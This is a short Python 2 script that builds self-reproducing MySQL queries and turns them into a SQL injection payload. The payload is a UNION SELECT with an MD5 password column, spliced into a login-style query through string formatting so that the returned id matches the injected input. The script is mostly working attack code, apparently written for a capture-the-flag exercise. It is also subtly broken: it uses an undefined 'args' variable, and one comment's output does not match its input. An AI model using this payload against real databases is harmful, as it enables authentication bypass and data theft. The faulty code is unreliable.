import MySQLdb as sql

# simple replacement
# SELECT $$ AS Quine
# $$ => REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)
#
# SELECT REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$) AS Quine
# $$ => 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'
#
# SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine

# replacement w/ single quote
# SELECT $$ AS Quine, MD5('apples') AS pw--
# $$ => REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)
#
# SELECT REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$) AS Quine, MD5('apples') AS pw--
# $$ => 'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- '
#
# SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- ',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine, MD5("apples") AS pw-- ') AS Quine, MD5('apples') AS pw--

def quine(data, debug=True):
	if debug: print data
	data = data.replace('$$',"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
	blob = data.replace('$$','"$"').replace("'",'"')
	data = data.replace('$$',"'"+blob+"'")
	if debug: print data
	return data

def execute(data, host='localhost', **dbArgs):
	db = sql.connect(host=host,**dbArgs).cursor()
	db.execute(data, args)
	return db.fetchall()

quine('SELECT $$ AS Quine')
# SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine

quine("SELECT $$ AS id,MD5(CHAR(122))-- ")
# SELECT REPLACE(REPLACE('UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5(CHAR(122))-- ',CHAR(34),CHAR(39)),CHAR(36),'UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS id,MD5(CHAR(122))-- ') AS id,MD5(CHAR(122))--

data = quine("' UNION SELECT $$ AS id,MD5(CHAR(122)) AS pw-- ")
results = execute("select id,pw FROM mem where id='%s'"%data)
print results[0]
print 'success' if (results[0][0] == data) else 'failure'
